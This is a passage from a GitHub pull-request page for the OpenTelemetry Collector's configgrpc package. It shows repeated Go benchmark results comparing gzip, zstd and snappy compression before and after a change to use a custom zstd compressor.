sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s
```

After this version:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&u=f3e75d1eea47083cb122d48dee765a83b0eaf2aa&v=4)](/mx-psi)
[mx-psi](/mx-psi)
mentioned this pull request
[Jun 5, 2024](#ref-pullrequest-2335961778)

[[configgrpc] Use own compressors for zstd (#10323)
#10324](/open-telemetry/opentelemetry-collector/pull/10324)
 Merged

[mx-psi](/mx-psi)
pushed a commit
to mx-psi/opentelemetry-collector
that referenced
this pull request
[Jun 5, 2024](#ref-commit-f5f1866)
[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling) [![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&v=4)](/mx-psi)

`[[configgrpc] Use own compressors for zstd (](/mx-psi/opentelemetry-collector/commit/f5f1866cc91dcb7ae47337d869fc354338c17be3 "[configgrpc] Use own compressors for zstd (#10323)

Uses our own version of the zstd compressor for gRPC servers. The code
for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s
```

After this version:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")[open-telemetry#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)[)](/mx-psi/opentelemetry-collector/commit/f5f1866cc91dcb7ae47337d869fc354338c17be3 "[configgrpc] Use own compressors for zstd (#10323)

Uses our own version of the zstd compressor for gRPC servers. The code
for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s
```

After this version:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
…

`[f5f1866](/mx-psi/opentelemetry-collector/commit/f5f1866cc91dcb7ae47337d869fc354338c17be3)`

```
